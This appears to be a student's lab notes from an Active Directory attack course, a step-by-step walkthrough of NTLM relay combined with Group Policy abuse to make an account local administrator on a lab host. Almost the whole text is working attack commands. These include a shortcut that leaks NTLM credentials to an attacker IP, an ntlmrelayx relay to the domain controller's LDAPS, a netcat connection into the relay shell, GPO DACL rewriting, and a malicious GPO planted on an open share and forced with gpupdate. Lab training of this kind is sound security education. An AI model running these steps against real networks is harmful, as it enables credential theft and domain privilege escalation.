# Learning Objective 6 — GPO Abuse via NTLM Relay

**Date:** 27 July 2026

---

## Attack Overview

Combines NTLM relay + GPO abuse to add studentx to local administrators on dcorp-ci.

**Attack Flow:**
1. Capture NTLM credentials via malicious shortcut
2. Relay credentials to DC (LDAP)
3. Modify GPO DACL to grant WriteDACL permission
4. Create malicious GPO with local admin membership
5. Force GPO application on target machine

---

## Step 1: Pre-requisite Check

Ensure firewall is disabled on all machines.

```powershell
# Check firewall status
netsh advfirewall show allprofiles
```

---

## Step 2: Create Malicious Shortcut

Create `student1.lnk` shortcut that triggers NTLM credential capture:

```powershell
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -command "invoke-webrequest -Uri 'http://172.16.100.1' -useDefaultcredentials"
```

Save this as `C:\AD\Tools\student1.lnk`

---

## Step 3: Setup NTLM Relay (Ubuntu/Linux)

Run ntlmrelayx to capture and relay NTLM credentials:

```bash
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.1 --http-port '80,8080' -i --no-smb-server
```

**Parameters:**
- `-t ldaps://172.16.2.1` — target DC LDAP service
- `-wh 172.16.100.1` — WPAD host (attacker IP)
- `--http-port '80,8080'` — listen on HTTP ports
- `-i` — interactive shell mode
- `--no-smb-server` — disable SMB server

---

## Step 4: Copy Shortcut to Network Share

From Windows client:

```powershell
xcopy C:\AD\Tools\student1.lnk \\dcorp-ci\AI
```

When a user accesses the share and opens the shortcut, NTLM relay is triggered.

---

## Step 5: Connect to Relay Session

In Ubuntu terminal, wait for relay connection. Once relay succeeds:

```bash
nc 172.16.100.1 <port>
```

You now have an interactive session with relayed credentials.

---

## Step 6: Modify GPO DACL

Inside the relay session:

```
# help
# write_gpo_dacl student1 {}
```

This grants WriteDACL permission on the GPO.

---

## Step 7: Create Malicious GPO

Create directory for malicious GPO:

```bash
mkdir /mnt/c/AD/tools/std1-gp
cp -r /mnt/c/ad/tools/GPoddity/GPT_out/* /mnt/c/ad/tools/std1-gp
```

---

## Step 8: Share the Malicious GPO

Create SMB share for the malicious GPO:

```powershell
net share std1-gp=c:\AD\tools\std1-gp
```

Grant Everyone full permissions:

```powershell
icacls "C:\AD\tools\std1-gp" /grant Everyone:F /T
```

---

## Step 9: Verify GPO Path

Check that `gPCFileSysPath` points to your malicious share:

```powershell
Get-DomainGPO | Select displayname, gPCFileSysPath
```

Should show path mapping to `\\<attacker_ip>\std1-gp`

---

## Step 10: Force GPO Update on Target

Use WinRS to trigger gpupdate on dcorp-ci:

```powershell
winrs -r:dcorp-ci cmd /c "set computername && set username"
```

Verify you have access, then:

```powershell
winrs -r:dcorp-ci gpupdate /force
```

---

## Step 11: Verify Local Admin Access

Confirm studentx is now local admin on dcorp-ci:

```powershell
Get-NetLocalGroupMember -ComputerName dcorp-ci -GroupName Administrators
```

---

## Key Concepts

**NTLM Relay:** Captures NTLM auth and relays to DC without cracking password.

**GPO DACL Abuse:** Modifying GPO permissions allows attackers to modify GPO content.

**gPCFileSysPath:** GPO file path; pointing to attacker share loads malicious policies.

**Interactive Relay:** ntlmrelayx `-i` flag provides interactive shell with relayed privileges.

---

## References

- [ntlmrelayx](https://github.com/fortra/impacket)
- [GPoddity](https://github.com/ired-team/GPoddity)

---

*Next: Learning Objective 7 — Persistence & Lateral Movement*
